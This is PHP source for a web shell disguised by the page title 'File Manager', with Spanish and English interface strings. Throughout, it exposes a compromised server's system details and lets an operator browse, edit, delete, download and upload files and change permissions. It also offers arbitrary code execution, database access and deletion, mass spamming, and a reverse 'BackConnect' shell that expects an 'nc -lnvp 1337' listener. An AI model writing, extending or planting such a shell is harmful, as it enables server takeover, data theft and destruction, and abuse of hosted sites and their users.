<?php
set_time_limit(0);
error_reporting(0);
language('esp'); /* Si tu lenguaje es ESPAÑOL, reemplaza  " language(''); "  por  " language('esp'); "*/

if (isset($_GET['hostm']) && isset($_GET['userm'])) {
	$hostm = base64_decode($_GET['hostm']);
	$userm = base64_decode($_GET['userm']);
	$passm = base64_decode($_GET['passm']); }

function language($lang) {
	global $lenguaje;
	if ($lang=='esp') {
		$lenguaje = array(0 => 'ON (Seguro)', 1 => 'OFF (No Seguro)', 2 => 'Ninguna',  3 => 'Nombre', 4 => 'Tipo', 5 => 'Tama&ntilde;o', 6 => 'Permisos', 7 => 'Opciones', 8 => 'Enlace', 9 => 'Crear Carpeta', 10 => 'Crear Archivo', 11 => 'Carpeta', 12 => 'Archivo', 13 => 'Borrar', 14 => 'Descargar', 15 => 'Editar', 16 => 'No se puede abrir el directorio,  lo siento.', 17 => 'Enviar', 18 => 'Ejecutar!', 19 => 'Usuario:', 20 => 'Contrase&ntilde;a:', 21 => 'Entrar!',  22 => 'Listar Tablas', 23 => 'Borrar',  24 => 'Descargar', 25 => 'Volver atras', 26 => 'Datos', 27 => 'Lo siento,  no se pueden listar las tablas de la db seleccionada.', 28 => 'Entrar!', 29 => 'Campo', 30 => 'Tipo', 31 => 'Nulo', 32 => 'Llave', 33 => 'Por defecto', 34 => 'Extra', 35 => 'La tabla seleccionada,  no tiene registros.', 36 => 'La base de datos fue borrada correctamente.', 37 => 'No se pudo borrar la base de datos.', 38 => 'Realmente deseas borrar la db', 39 => 'Si', 40 => 'La tabla fue borrada correctamente.', 41 => 'No se pudo borrar la tabla.', 42 => 'Realmente deseas borrar la tabla', 43 => 'Tu email', 44 => 'Lista de emails', 45 => 'Titulo', 46 => 'Contenido HTML', 47 => 'Conectando', 48 => 'Si no tienes habilitados los iframes,  has clic ', 49 => 'aqui', 50 => 'Conectar', 51 => '( Debes ejecutar en tu pc: <b>nc -lnvp 1337</b>,  y tener el puerto abierto :) )', 52 => 'IP del servidor', 53 => 'My IP', 54 => 'SI',  55 => 'NO',  56 => 'Funciones Deshabilitadas', 57 => 'Inicio', 58 => 'Codigo PHP', 59 => 'Conexion Reversa', 60 => 'Si el tipo de funci&oacute;n utilizada para vizualizar el archivo no funciona,  puedes intentar abrir el archivo con', 61 => 'Archivo Guardado Correctamente!', 62 => 'Lo siento,  no se ha podido guardar el archivo.', 63 => 'Ejecuci&oacute;n de codigo PHP (No escribir los tags php!)', 64 => 'Error subiendo archivo', 65 => 'No se puede copiar ', 66 => 'al dir', 67 => 'Archivo Subido correctamente', 68 => 'Carpeta Borrada', 69 => 'Archivo Borrado', 70 => 'Carpeta Creada', 71 => 'Nombre de la carpeta', 72 => 'Crear DIR!', 73 => 'Archivo Creado', 74 => 'Nombre del archivo', 75 => 'Crear Archivo!', 76 => 'Lo siento,  no se puede descargar el archivo', 77 => 'Volver Atras', 78 => 'Logueado correctamente', 79 => 'Listar DBS', 80 => 'Salir', 81 => 'Login Incorrecto.', 82 => 'Spammeado correctamente', 83 => 'No fue spammeado', 84 => 'Subir Archivos', 85 => 'Utilidades', 86 => 'Estas seguro que deseas borrar los siguientes archivos/carpetas?', 87 => 'Estas seguro que deseas borrar el siguiente archivo:', 88 => 'Estas seguro que deseas borrar la siguiente carpeta:', 89 => 'Lo siento, no se pueden leer los permisos', 90 => 'CHMOD Cambiado', 91 => 'Error al cambiar el CHMOD', 92 => 'Caracter Inv&aacute;lido', 93 => 'Permisos actuales', 94 => 'Nuevos permisos', 95 => 'Lo siento, no has seleccionado archivos', 96 => 'Link erroneo'); }
		else {
			$lenguaje = array(0 => 'ON (Secure)', 1 => 'OFF (Not Secure)', 2 => 'None',  3 => 'Name', 4 => 'Type', 5 => 'Size', 6 => 'Perms', 7 => 'Options', 8 => 'Link', 9 => 'Make folder', 10 => 'Make file', 11 => 'Folder', 12 => 'File', 13 => 'Delete', 14 => 'Download', 15 => 'Edit', 16 => 'Unable to open the directory,  sorry.', 17 => 'Send', 18 => 'RUN!', 19 => 'User:', 20 => 'Password:', 21 => 'Login!',  22 => 'List Tables', 23 => 'Deñete',  24 => 'Download', 25 => 'Go back', 26 => 'Data', 27 => 'Lo siento,  no se pueden listar las tablas de la db seleccionada.', 28 => 'Login!', 29 => 'Campo', 30 => 'Type', 31 => 'Null', 32 => 'Key', 33 => 'Default', 34 => 'Extra', 35 => 'The selected table has no records.', 36 => 'The database was deleted successfully.', 37 => 'Could not delete the database.', 38 => 'I really want to delete the database', 39 => 'Yes', 40 => 'The table was deleted successfully.', 41 => 'Could not delete the table.', 42 => 'I really want to clear the table', 43 => 'Your email', 44 => 'MailList', 45 => 'Title', 46 => 'Content HTML', 47 => 'Connecting', 48 => 'If you do not have iframes enabled,  you click', 49 => 'HERE', 50 => 'Connect', 51 => '( You run on your pc: <b>nc -lnvp 1337</b>,  and have the port open :) )', 52 => 'IP of server', 53 => 'Your IP', 54 => 'ON',  55 => 'OFF',  56 => 'Disabled Functions', 57 => 'Index', 58 => 'PHP RUN', 59 => 'BackConnect', 60 => 'If the type of function used to visualize the file does not work,  you try to open the file with', 61 => 'File saved successfully!', 62 => 'Sorry,  could not save the file.', 63 => 'Running PHP code (not write the php tags!)', 64 => 'Error uploading file', 65 => 'Cant copy', 66 => 'in the directory', 67 => 'File saved successfully', 68 => 'Folder deleted', 69 => 'File Deleted', 70 => 'Folder Maked', 71 => 'Name folder', 72 => 'Make Dir!', 73 => 'File created', 74 => 'Name file', 75 => 'Make File!', 76 => 'Sorry, you cant download the file', 77 => 'Go back', 78 => 'Logged correctly', 79 => 'List databases', 80 => 'Exit', 81 => 'Login Incorrect.', 82 => 'Spammed correctly', 83 => 'Was not spammed', 84 => 'Upload Files', 85 => 'Utilities', 86 => 'Are you sure you want to delete the following files / folders ?', 87 => 'Are you sure you want to delete the following file:', 88 => 'Are you sure you want to delete the following folder:', 89 => 'Sorry, can not be read permissions', 90 => 'CHMOD changed', 91 => 'Failed to change the CHMOD', 92 => 'Invalid Character', 93 => 'Current Permits', 94 => 'New Permits', 95 => 'I\'m sorry, you did not select files', 96 => 'Invalid link');
		}
	}

function css() {
	echo '<style type="text/css">
	<!--
	body, td { 
		font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	 	font-size: 11px;
	 	color: #FFFFFF; }
	 
	body { background-color: #000000; }

	a:link {
		color: #FFFFFF;
	 	text-decoration: none;
	 	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
	 	font-size: 11px; }
	
	a:visited { color: #AD0000; }

	a:hover { color: #CE0000; }
	
	textarea {
		background-color:#000000;
	 	border:1px #e7e7eb dashed;
	 	color:white; }
	
	input {
	 	background:none;
	 	border:solid;
	 	color:white;
	 	font-size:10px;
	 	border-width:1px; }
	-->
	</style>';
}

function header_index() {

	global $lenguaje;
	echo '<title>'.$_SERVER['HTTP_HOST'].' - File Manager</title><div align="center">
	<table style="Border-Collapse: collapse;" cellSpacing="0" borderColorDark="#666666" cellPadding="0" width="100%" bgColor="#4a494a" border="1">
	<tr>
	<td style="padding: 8px;"><b>System</b>: <font color="red">'.php_uname().'</font><br/>
	<b>Software</b>: <font color="red">'.$_SERVER['SERVER_SOFTWARE'].'</font> | <a href="?id=phpinfo">PHP</a><br />
	<b>Safe Mode</b>: ';

	if (strtolower(ini_get("safe_mode")) or ini_get("safe_mode") == "on") { echo '<font color=red><b>'.$lenguaje[0].'</b></font>'; }
	else { echo '<font color=#00FF00><b>'.$lenguaje[1].'</b></font>'; }
	echo '<br />';
	exp_dirs();
	echo '</td>
	</tr>
	</table><br />';
}

function ver_tam($tam) {

    if (!is_numeric($tam)) { return FALSE; }
    else {
    	if ($tam >= 1073741824) { $tam = round($tam/1073741824*100)/100 .' GB'; }
		elseif ($tam >= 1048576) { $tam = round($tam/1048576*100)/100 .' MB'; }
		elseif ($tam >= 1024) { $tam = round($tam/1024*100)/100 .' KB'; }
		else { $tam = $tam . ' B'; }
		return $tam; }
	}
	
function disable_functions() {
	global $lenguaje;
	if ($disablefunc=ini_get("disable_functions")) { return '<font color=#FF9900><b>'.$disablefunc.'</b></font>'; }
	else { return '<font color=#00FF00><b>'.$lenguaje[2].'</b></font>'; }
}
	
function buffer_exec($buffer) {
	global $result;
	$result = htmlspecialchars(ob_get_contents());
}
	
function exp_dirs() {
	global $dir;
	if (trim($dir)=='') { $dir = @getcwd(); }
	elseif(!trim($dir)=='') { $dir = @realpath($dir); }

	if (substr($dir,-1) != DIRECTORY_SEPARATOR) { $dir .= DIRECTORY_SEPARATOR; }
	$pd = $e = explode(DIRECTORY_SEPARATOR,substr($dir,0,-1));
	$i = 0;
	echo '<b>Directorio</b>: ';
	foreach($pd as $b) {
		$t = "";
		$j = 0;
		foreach ($e as $r) {
			$t.= $r.DIRECTORY_SEPARATOR;
			if ($j == $i) { break; }
			$j++; 
		}
		echo '<a href="?id=dir&d='.urlencode($t).'"><b>'.htmlspecialchars($b).DIRECTORY_SEPARATOR.'</b></a>';
		$i++;
	}
}

function ver_permisos($modo) {
	if (($modo & 0xC000) === 0xC000) { $tipo = 's'; }
	elseif (($modo & 0x4000) === 0x4000) { $tipo = 'd'; }
	elseif (($modo & 0xA000) === 0xA000) { $tipo = 'l'; }
	elseif (($modo & 0x8000) === 0x8000) { $tipo = '-'; }
	elseif (($modo & 0x6000) === 0x6000) { $tipo = 'b'; }
	elseif (($modo & 0x2000) === 0x2000) { $tipo = 'c'; }
	elseif (($modo & 0x1000) === 0x1000) { $tipo = 'p'; }
	else { $tipo = '?'; }
	$prop['read'] = ($modo & 00400)?'r':'-';
 	$prop['write'] = ($modo & 00200)?'w':'-';
 	$prop['execute'] = ($modo & 00100)?'x':'-';
 	$group['read'] = ($modo & 00040)?'r':'-';
 	$group['write'] = ($modo & 00020)?'w':'-';
 	$group['execute'] = ($modo & 00010)?'x':'-';
 	$world['read'] = ($modo & 00004)?'r':'-';
 	$world['write'] = ($modo & 00002)? 'w':'-';
 	$world['execute'] = ($modo & 00001)?'x':'-';
 	return $tipo.join($prop).join($group).join($world);
}

function ver_permisos_color($file_color) {
	global $dir;
	if (!is_readable($file_color)) {
		return '<a href="?id=pwn_chmod&pwnd='.$file_color.'&d='.$dir.'" style="color: red;">'.ver_permisos(fileperms($file_color)).'</a>'; 
	}
	elseif (!is_writable($file_color)) {
		return '<a href="?id=pwn_chmod&pwnd='.$file_color.'&d='.$dir.'" style="color: white;">'.ver_permisos(fileperms($file_color)).'</a>';
	}
	else {
		return '<a href="?id=pwn_chmod&pwnd='.$file_color.'&d='.$dir.'" style="color: #00FF00;">'.ver_permisos(fileperms($file_color)).'</a>';
	}
}

function listar_archivos($dir) {
	global $lenguaje;

	if ($dh=@dir($dir)) {
		while ($file = $dh->read()) {
			if (($file=='.') or ($file=='..')) {
				$links_ls[]=$file;
			}
			elseif (is_dir($dir.'/'.$file)) {
				$dirs_ls[]=$file;
			}
			else {
				$archivos_ls[]=$file;
			}
		}
		echo '
		<table style="Border-Collapse: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=3 width="100%" bgColor=#000000 borderColorLight=#c0c0c0 border=1 valign="middle">
		<tr align="center" style="height: 30px; background-color: coral;">
		<td style="width: 30%;"><b>'.$lenguaje[3].'</b></td>
		<td style="width: 17%;"><b>'.$lenguaje[4].'</b></td>
		<td style="width: 17%;"><b>'.$lenguaje[5].'</b></td>
		<td style="width: 17%;"><b>'.$lenguaje[6].'</b></td>
		<td style="width: 17%;"><b>'.$lenguaje[7].'</b></td>
		</tr>';
		$color = 0;
		if(isset($links_ls)) {
			foreach ($links_ls as $links) {
				if ($links=='..') {
					echo '<tr ';
					if (!$color) {
						echo 'bgcolor="#333333"';
						$color = 1; 
					} 
					else { 
						$color = 0; 
					}
					echo ' valign="middle" height="5">
					<td><a href="?id=dir&d='.realpath($dir.'/..').'">'.$links.'</a></td>
					<td align="center">'.$lenguaje[8].'</td>
					<td align="center">---</td>
					<td align="center">'.ver_permisos_color(realpath($dir.'/..')).'</td>
					<td>---</td>
					</tr>';
				}
				elseif ($links=='.') {
					echo '<tr ';
					if (!$color) {
						echo 'bgcolor="#333333"';
						$color_nm = "#333333";
						$color = 1;
					}
					else {
						$color_nm = "#000000";
						$color = 0;
					}
					echo ' valign="middle" height="5">
					<td><a href="?id=dir&d='.realpath($dir.'/.').'">'.$links.'</a></td>
					<td align="center">'.$lenguaje[8].'</td>
					<td align="center">---</td>
					<td align="center">'.ver_permisos_color(realpath($dir.'/.')).'</td>
					<td><a href="?id=mkdir&d='.realpath($dir.'/').'" style="border:none; color:'.$color_nm.';"><img src="?id=icono&tipo=agregar_carpeta"></a><a href="?id=mkfile&d='.realpath($dir.'/').'" style="border:none; color:'.$color_nm.';"><img src="?id=icono&tipo=agregar_archivo"></a></td>
					</tr>';
				}
			}
		}
		if(isset($dirs_ls)) {
			asort($dirs_ls);
			foreach ($dirs_ls as $dirs) {
				echo '<tr ';
				if (!$color) {
					echo 'bgcolor="#333333"';
					$color_nm = "#333333";
					$color = 1;
				}
				else {
					$color_nm = "#000000";
					$color = 0;
				}
				echo ' valign="middle">
				<td><a href="?id=dir&d='.realpath($dir.'/'.$dirs).'">['.$dirs.']</a></td>
				<td align="center">'.$lenguaje[11].'</td>
				<td align="center">---</td>
				<td align="center">'.ver_permisos_color(realpath($dir.'/'.$dirs)).'</td>
				<td><a href="?id=rmdir&d1r='.realpath($dir.'/'.$dirs).'&d='.realpath($dir.'/').'" style="border:none; color:'.$color_nm.';"><img src="?id=icono&tipo=borrar"></a></td>
				</tr>';
			}
		}
		if(isset($archivos_ls)) {
			asort($archivos_ls);
			foreach ($archivos_ls as $archivo) {
				echo '<tr ';
				if (!$color) {
			 		echo 'bgcolor="#333333"';
					$color_nm = "#333333";
					$color = 1; 
				}
				else {
					$color_nm = "#000000";
					$color = 0; 
				}
				echo ' valign="middle" height="5">
				<td><a href="?id=a_edit&d='.realpath($dir.'/').'&a='.$archivo.'&w=ZnJlYWQ=">'.$archivo.'</a></td>
				<td align="center">'.$lenguaje[12].'</td>
				<td align="center">'.ver_tam(filesize(realpath($dir.'/'.$archivo))).'</td>
				<td align="center">'.ver_permisos_color(realpath($dir.'/'.$archivo)).'</td>
				<td>
				<a href="?id=rm_file&fil3='.realpath($dir.'/'.$archivo).'&d='.realpath($dir.'/').'" style="border:none; color:'.$color_nm.';"><img src="?id=icono&tipo=borrar"></a> 
				<a href="?id=fdown&fil3_down='.$archivo.'&fil3_path='.realpath($dir.'/'.$archivo).'&d='.realpath($dir.'/').'" style="border:none; color:'.$color_nm.';"><img src="?id=icono&tipo=descargar"></a>  
				<a href="?id=a_edit&d='.realpath($dir.'/').'&a='.$archivo.'&w=ZnJlYWQ=" style="border:none; color:'.$color_nm.';"><img src="?id=icono&tipo=editar"></a></td>
				</tr>';
			}
		}
		echo '</table>';
	}
	else {
		echo $lenguaje[16];
	}
}

function mostrar_iconos($icono) {
	if ($icono=='carpeta') {
		$mostrar_icono='R0lGODlhEAAQAPcAAP//////zP//mf//Zv//M///AP/M///MzP/Mmf/MZv/MM//MAP+Z//+ZzP+Zmf+ZZv+ZM/+ZAP9m//9mzP9mmf9mZv9mM/9mAP8z//8zzP8zmf8zZv8zM/8zAP8A//8AzP8Amf8AZv8AM/8AAMz//8z/zMz/mcz/Zsz/M8z/AMzM/8zMzMzMmczMZszMM8zMAMyZ/8yZzMyZmcyZZsyZM8yZAMxm/8xmzMxmmcxmZsxmM8xmAMwz/8wzzMwzmcwzZswzM8wzAMwA/8wAzMwAmcwAZswAM8wAAJn//5n/zJn/mZn/Zpn/M5n/AJnM/5nMzJnMmZnMZpnMM5nMAJmZ/5mZzJmZmZmZZpmZM5mZAJlm/5lmzJlmmZlmZplmM5lmAJkz/5kzzJkzmZkzZpkzM5kzAJkA/5kAzJkAmZkAZpkAM5kAAGb//2b/zGb/mWb/Zmb/M2b/AGbM/2bMzGbMmWbMZmbMM2bMAGaZ/2aZzGaZmWaZZmaZM2aZAGZm/2ZmzGZmmWZmZmZmM2ZmAGYz/2YzzGYzmWYzZmYzM2YzAGYA/2YAzGYAmWYAZmYAM2YAADP//zP/zDP/mTP/ZjP/MzP/ADPM/zPMzDPMmTPMZjPMMzPMADOZ/zOZzDOZmTOZZjOZMzOZADNm/zNmzDNmmTNmZjNmMzNmADMz/zMzzDMzmTMzZjMzMzMzADMA/zMAzDMAmTMAZjMAMzMAAAD//wD/zAD/mQD/ZgD/MwD/AADM/wDMzADMmQDMZgDMMwDMAACZ/wCZzACZmQCZZgCZMwCZAABm/wBmzABmmQBmZgBmMwBmAAAz/wAzzAAzmQAzZgAzMwAzAAAA/wAAzAAAmQAAZgAAMwAAAP//lP//nP//9//3jP/3nP/3pf/vhP/ne//nhL2eMbWOGN62Of/fe5x5GN62Qt62Sv/Xa6V5EOe+UvfXhP/PYwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAEAAQAAAIhgCvCRxIsKDBgwbDKQyHcGA4ABC1MUT4MJvFbADEadSYziG3bSBBQhzZUWA4b+A2qlx5LRw5cQC0yZQ5cp02ceXCoRN3MVu3nuyy4QzHjie2o0ixbVMnNGfRbOCiSgXn7Vy3oU+/ad36jZy5pkR5ohtLduw4bjivrVy7sZzAcnDjyo3bEGFAADs=';
	}
	elseif ($icono=='link') {
		$mostrar_icono='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAABIAAAASABGyWs+AAACOklEQVQ4y8VTS2gTYRCe+XezzbbNsylNmqDFxkZjoF6Mj0SQGhNQUIqgHuoDDxU8exBFBKleRL1IwYMXUUEPHooUBKNSFJvQUqvGEIU0jzZ1NzHpI41Juru/hxqMxZMVnOPMfN83zMyHlFJYS5A1of8FAbs6IUkSpFMpXTyZMkuyrDIZDfkue6eo0eqk+r7PsZieMIz8G4EgCPzd+499b2KCr8oZ2pBRMVBeKJrVlcjRgGd4n68nynEc/RSNtp2/fO3EyWO9w1hb4mwm03jp+uCpJNr8equdJYQoP2tYXlrEpdT7vH9LyyN3t/PDnSev+tPz0sZzh7dfQUopLC9XYeDG4JHXQkOfulmPUrmosLyW8FoDEEQKAJQCkELi4/eyODXX4tpjKYmJ4tm9nQMsAEAoPNbxMpI50MTzM25LNbh+k1mMxdMd775EPWy7q53X6AEpVQwdLjVd57QwrIqWBAoAiKyiyPD0+YiXrSzMXTxz6JZn184EEgKyLI2Mj0+8uP1gqO9btWtHk9FMEACQEAp1v0NEMdsYDo1uON3b89Dr9SSQrFyWYVhwu7dNH9zdPVSYmlz847shAJtMJltNzQ2Z/QHfxOr629GQ7d6zseOtTo+OEPJLmBAAXBFis9msOhDwTxqNxmo9OBwKmS9cvdmvWLY6+MLXaiU/W1NFRAbKhYyEaKcYDAYtVqu15HA45usJIpGIKTU9Y2NVHK2dE2tzAwAiVVzOzXHM5XKMRqNROI77K1fhf3fjD83C6LLhE0Y7AAAAInpUWHRTb2Z0d2FyZQAAeNorLy/Xy8zLLk5OLEjVyy9KBwA22AZYEFPKXAAAAABJRU5ErkJggg==';
	}
	elseif ($icono=='archivo') {
		$mostrar_icono='R0lGODlhEAAQAPcAAP//////zP//mf//Zv//M///AP/M///MzP/Mmf/MZv/MM//MAP+Z//+ZzP+Zmf+ZZv+ZM/+ZAP9m//9mzP9mmf9mZv9mM/9mAP8z//8zzP8zmf8zZv8zM/8zAP8A//8AzP8Amf8AZv8AM/8AAMz//8z/zMz/mcz/Zsz/M8z/AMzM/8zMzMzMmczMZszMM8zMAMyZ/8yZzMyZmcyZZsyZM8yZAMxm/8xmzMxmmcxmZsxmM8xmAMwz/8wzzMwzmcwzZswzM8wzAMwA/8wAzMwAmcwAZswAM8wAAJn//5n/zJn/mZn/Zpn/M5n/AJnM/5nMzJnMmZnMZpnMM5nMAJmZ/5mZzJmZmZmZZpmZM5mZAJlm/5lmzJlmmZlmZplmM5lmAJkz/5kzzJkzmZkzZpkzM5kzAJkA/5kAzJkAmZkAZpkAM5kAAGb//2b/zGb/mWb/Zmb/M2b/AGbM/2bMzGbMmWbMZmbMM2bMAGaZ/2aZzGaZmWaZZmaZM2aZAGZm/2ZmzGZmmWZmZmZmM2ZmAGYz/2YzzGYzmWYzZmYzM2YzAGYA/2YAzGYAmWYAZmYAM2YAADP//zP/zDP/mTP/ZjP/MzP/ADPM/zPMzDPMmTPMZjPMMzPMADOZ/zOZzDOZmTOZZjOZMzOZADNm/zNmzDNmmTNmZjNmMzNmADMz/zMzzDMzmTMzZjMzMzMzADMA/zMAzDMAmTMAZjMAMzMAAAD//wD/zAD/mQD/ZgD/MwD/AADM/wDMzADMmQDMZgDMMwDMAACZ/wCZzACZmQCZZgCZMwCZAABm/wBmzABmmQBmZgBmMwBmAAAz/wAzzAAzmQAzZgAzMwAzAAAA/wAAzAAAmQAAZgAAMwAAAFJRUgAAnACGAJyenISGhM7Pzufn1v/PMYQAAAgICAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAEAAQAAAIfACvcRtIsOC2awgRcvPGsGHDbdgSCgRAsWLFbQAiKrTIESI2jdwAFBwZrhtIkdm+ZVvJMlzGjdxYyszm8mRIjgC81YQJoAA4itJy7pwYEtwIANJoSdP5kijFnwC0aWNq06HDoSHDad3KtelNnBZBdhtLtuxYjR/Tql17LSAAOw==';
	}
	elseif ($icono=='borrar') {
		$mostrar_icono='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAXUlEQVR42u2SwQoAIAhD88vVLy8KBlaS0i1oJwP3piGVg0Skmpq8HjqZrWl9uwCbGAmwKYGZs/6iqgMyAdJuM8W2QmYKpLt/0AG9ASCv/oAnANd3AEjmAlFT1BypAV+PnRH5YehvAAAAAElFTkSuQmCC';
	}
	elseif ($icono=='editar') {
		$mostrar_icono='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsSAAALEgHS3X78AAAAB3RJTUUH1gkCDTgyeDqBQAAAAB10RVh0Q29tbWVudABDcmVhdGVkIHdpdGggVGhlIEdJTVDvZCVuAAABp0lEQVQ4y42RvUtbURjGfzfECI0U6eIQFNLFrRCHLkIrWAX/gYLk+oWDQ7OUQkgQ2qEEw8X+AaUgxNh2KIpLQLSCBEHQ4pAttEvNFM29mXJRDpy3Q416c68fD5zhvIf39z7vcwyuNZy3cvvcr7FMevGnr5q3cqK19h2llCilxHVdUUpJ3spJ3sq9aveFOkGO42DbNnbDptFo4DQdfh0dsbVdon5a593bNMBOG+IDiAgigkbQIogW4k/jNJtNoo+i1E/rmMkZgB2AsA+ghZXCF09t2pyjJ/qYjc0fuK5Lq9W6evMBtGhmpuYBgUsXWjSJxBAnJ3+JRCL0fH4JwLiJGQ5aoVBcufULxiuLDGag+/cLKuvlYiBgKjmLICD/722dZfuvmi8Oy9ySgab4rXDn5IvDMtUaAO8DMhCSk9OeWufkag3+9I3y+tPux3DQnl+/r3qn420eWFhl+6AG7BqBgJsOzrL9DK3BG3XOfBf0pko8eT4BB0vBGXQ6yKzBsQm9qQ90xZ55wgbkXgedebRlGEawg1gsxkOktfYB9qzlpREeqFAotAfwD53h3AFtQ/QoAAAAAElFTkSuQmCC';
	}
	elseif ($icono=='descargar') {
		$mostrar_icono='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAANkE3LLaAgAAAoFJREFUeJx1kstL1FEYhp9zzsw45VxSs5Fuk8NITldqMCWKIDCQiogW0UKoDCKCWrUOoj+gVYsocNGiRWBEi6A2CQXahJV2WdSgdNGiJh3NnzO/c2mhjZL2rc7ifR/e872fYIlJH01f3X9sf6ee0VMCgQqryOO7j2/l7+Wv/KsNLAVINTZmujpOrdeeDwJUOMhwLt+UJ79IuyRg2vzSH6cGMZ7BAQGtmBbjZimtWvCWbeeyNzP70scbdsR2xxpCcc+N4zHOpCkw7Sbiq1NrW+q31x38nBt9ALhFCULN5fa9h7PrjO9RcB8IBiUAvnaksisbk7tk45MHuZG/5kWATi8z3P+qt97f4sLxQIyIWIF1mh+M8b00SmSw2jtd3vPpGe8Xf+FEe/Ptg61Nh6rfI/WMJyKp1axZniYarAXrk+iTtLxLy6aGug2ZVCL1qO9DTwVw+dKZqx3ZVR0DAy9qvn7+JnhTxo0Itmw+QKxUz5cbz7G9RX4WCvLr6BfasptSieTWxNP+1w8DAL8nJ5sS1SI1EqlhWbQWJSR+0THWk8M5qJuKUJWO4pxFOkNUlKLC2UxlB8boeFAb9rVuxvkeQkhAYLSPEALZkATncA4sIEtFgk7GKgCrjRZYVm5s5VH3NRz2n7YFAF7ZcqTrIt9z95kpq1IF4CQ+QoKqAhViZ3brAnOlMQZeDEEoPJfEzgOEFT5qtnNjDK8GhnAVo6gAjJk9RhkIYayeBxhEGTl7EkoptjUnsdYgpcLaOZNSvHw7AoDWGmdZkEBILQWApf3kBf437S0OEKhQECtMqZIvHCZ59vjh60gZcDgnhQQxF93N78ACdfFIdaFQLHbfuX9+osTwHy4bB5h5T+YrAAAAAElFTkSuQmCC';
	}
	elseif ($icono=='agregar_archivo') {
		$mostrar_icono='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAWdJREFUeNqkUz1rg1AUvUr3jIEKmkxdav6Bq4hDELpkz/7GLP4Dx/wJs9ShlKBZ8xe6dMpWUggkEMSE+NF3hGfV2rS0Fy7vvofn3HOu70lFUdB/4qbr0PO8a6wPs9ks+JZAgC3LotFo1EX+yBdJ7OU2GEARSZJQHMd0PB7pcDh0ypHbYN71WZxlWdZIxGQywTLnOUQhYYhtz4qivOu63tc0jfI8L8FYF4sFLZdLMgzjzXVdBQ2rGdSl8+gPBgNK07RSAgKA7+b3tGbrW5yHYfhJgIHBKz5EXi6XCuj7PkVR1PDOGxZQ0vgLAlCXjQQYnUWIGko6CergXq9HpmnSiq0q8Ct7KWsokNsE8C2mjnq/39N0OqUgCBoWuH8Jg2wQtMFYz+czbbdbOp1OZNt22R2dxeB/tCByt9sRY4wcxyFVVXEbh1zF5qoFkSCAAgTuAg/Gc/PlLeDf//U1jvltfPolZlzffAgwAMubE3kVfrHwAAAAAElFTkSuQmCC';
	}
	elseif ($icono=='agregar_carpeta') {
		$mostrar_icono='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAqZJREFUeNqMUltIFFEY/v45Z3bd1Wy9BaVpKlkSaiRivXaxoCBCEuwhgqDsISoxkCAIeiojeiixXoTowbLLQ9CD9GohorimSGKTLqWZYnnZNfcyp//MeCMK+pl/Zs5/vv/+UX/LgR92PBpQdgJayBAgIb8SGYf55NUmrAg5jwRR14pZaueyulYgFndBQqD3/qlsDjJAtOa7GoMTGNKcIkNucgIo22bnJUSHm6AUwcyuxp66J4BBq1ndl3I/0kSw+XSWMEUFV9ItHZAK84WP7wXik29WwboC4kDk/GugDaPwCl8rDIVmo8V5Ae5HIxMRLovbJbHWMn8MYeBz90fMhCb4qJwARLWMlSja7O3jub1yA+AXhEcHkE4qt2qC1TWIlIAXhce5JXt5RiutmB4EW86ekE5tIorRnmFMW1/Wjwt55duRnpOBmHUPpNSyVcHw5SAqdmA2Eu+SZBhYmrAQXZhHRX0bZ+J1KnLaSYSauV0DkjE8dd2TG3tDMSKDgxifirVJ3jfmJsaQmrMTiFiwpzt0DicXiSQI7Sh8aB14ivZPvU717IIqbx4uNY09FheOFdyAiiOzqASml1eKRR5FEquHh+UBPH52fob3P3uwvxw4s68BKWnvMBSZxbYj8Bt6TfPfJuHP38rgJVBKgHWjo0jWmobnI90ozQfCvO3SjCaEI8CuXIbbuChtRXO8ltTgwwfQpFJr7GFWEHzwaoqgMvsqKrbcduyXKxV6xhvR2XfLQZZdqy3eHYsnEupP3tqwF8L24veakZd7C3jZMeD6QYWbbwl+E+i3mH8fHlUFS851jLgL/qvYRw+h3RrHydxMoHO0kfkP8BmLM3hBHAD/El4e/MqD/POvc6vv4G5yOqo1HTR1tHN7A+oJ/y88NmStO0+xhn4LMACJMOOyazadagAAAABJRU5ErkJggg==';
	}
	if ($mostrar_icono) {
		header("Content-type: image/gif");
		echo base64_decode($mostrar_icono);
	}
	else {
		echo 'kkr';
	}
}
	
function upload_file($dir) {
	global $lenguaje;
	echo '<form action="?id=upload_fil3&d='.$dir.'" method="post" enctype="multipart/form-data">
	<input type="file" name="uploadfile" /><br />
	<br />
	<input type="submit" value="'.$lenguaje[17].'" /><br /><br />';
	if (is_writable($dir)) {
		echo '<b><font color=#00FF00><b>Pwn! -> ('.ver_permisos(fileperms($dir)).')</b></font></b>';
	}
	else {
		echo '<b><font color=red>Pwn! -> ('.ver_permisos(fileperms($dir)).')</font></b>';
	}
	echo '</form>
    </td>
	</tr>';
}
	
function f0rm_exec($dir) {
	global $lenguaje;
	echo '<form action="?id=c0d3_3x3c&d='.$dir.'" method="post">
	<input type="input" name="ax3" size="50"/> <br />
	<br />
	<input type="submit" value="'.$lenguaje[18].'" />';
    echo '</form>';
}

function is_disabled($funcion) {
	$funciones_deshabilitadas=explode(',',ini_get('disable_functions'));
	return in_array($funcion, $funciones_deshabilitadas);
}

